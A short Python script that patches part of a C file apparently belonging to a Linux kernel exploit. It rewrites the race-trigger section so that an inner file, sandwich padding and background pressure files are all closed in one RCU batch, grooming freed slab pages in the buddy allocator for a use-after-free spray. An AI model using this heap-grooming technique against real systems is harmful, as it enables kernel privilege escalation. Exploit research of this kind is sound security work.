import re

with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

old_close = """    printf("[*] Triggering race by closing inner... (GDB-assisted survivor)\\n");
    fflush(stdout);
    
    getpid(); // Enable __fput hook in GDB
    close(inner);
    
    // Close sandwich padding to free the victim slab page
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }

    printf("[*] RACE TRIGGERED. Waiting for Victim RCU...\\n");
    fflush(stdout);
    sleep(2); // Victim page goes to buddy allocator
    
    printf("[*] Closing background pressure files to bury the victim page...\\n");
    fflush(stdout);
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }
    
    printf("[*] Waiting for BG Pressure RCU...\\n");
    fflush(stdout);
    sleep(2); // BG pages go to buddy allocator, ON TOP of victim page!"""

new_close = """    printf("[*] Triggering race by closing inner and all padding AT ONCE...\\n");
    fflush(stdout);
    
    getpid(); // Enable __fput hook in GDB
    
    // Close in order: inner, then batch, then bg.
    // They will go into the same RCU batch, return to buddy at the same time.
    close(inner);
    
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }

    printf("[*] Waiting for Single RCU Grace Period...\\n");
    fflush(stdout);
    sleep(2); // All pages go to buddy allocator at the end of this!"""

text = text.replace(old_close, new_close)

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
